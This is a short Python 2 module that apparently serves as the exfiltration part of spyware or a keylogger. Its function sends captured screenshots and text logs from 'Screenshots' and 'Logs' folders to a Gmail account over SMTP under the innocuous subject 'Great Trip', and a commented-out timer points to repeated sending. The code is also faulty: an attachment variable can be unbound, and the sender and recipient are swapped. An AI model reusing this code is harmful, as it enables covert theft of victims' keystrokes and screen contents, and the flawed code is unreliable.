#!/usr/bin/env python

# All of the program settings are definced in Settings.py
from Settings import *
from paths import *



def send_new_email(folder_path):
    
    """This function sends logs through emails"""
    #threading.Timer(5,send_new_email,[folder_path]).start()
    
    login_pass = 'xxxxxxxxxxxxxxxx'
    to_  = 'xxxxxxxxxxxxxxx'
    from_ = 'xxxxxxxxxxxx'
    
    # Create the container (outer) email message.
    message = MIMEMultipart()
    message['Subject'] = 'Great Trip'
    message['From'] = from_
    message['To'] = to_

    # Assume we know that the image files are all in PNG format
    
    if folder_path.endswith('Screenshots'):
        for file in glob.glob(folder_path + '\\*.jpg'):
            images_file = open(file, 'rb')
            img = MIMEImage(images_file.read())
            images_file.close()
            message.attach(img)

   
    elif folder_path.endswith('Logs'):
        
        for file in glob.glob(folder_path + '\\*.txt'):
    
            # if the file ends with txt, attach it
            if file.endswith('.txt'):
                #Encoders.encode_base64(message)
                output_file = open(file)
                attachment = MIMEText(output_file.read())
                output_file.close()
    
            # attach the file
            attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
            message.attach(attachment)
         
    else:
        # TO DO "SEND ALERT EMAIL OR MESSAGE"
        print "NOT JPG FILE"
        
    # Send the email
    smtp_server = smtplib.SMTP('smtp.gmail.com:587')
    smtp_server.starttls() # adds TLS encyprtion
    smtp_server.login(to_, login_pass)
    smtp_server.sendmail(to_, from_, message.as_string())
    smtp_server.quit()


